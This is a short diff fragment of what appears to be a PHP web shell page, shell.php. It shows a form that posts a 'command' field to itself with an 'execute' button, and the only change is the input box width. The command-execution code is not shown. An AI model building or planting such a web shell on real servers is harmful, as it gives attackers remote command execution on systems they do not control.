@@ -33,7 +33,7 @@ fclose( $file );
 -->
 
 	<form action="shell.php" method="post">
-		<input type="text" style="width: 700px" name="command">
+		<input type="text" style="width: 630px" name="command">
 		<input type="submit" value="execute">
 	</form>
 <br>
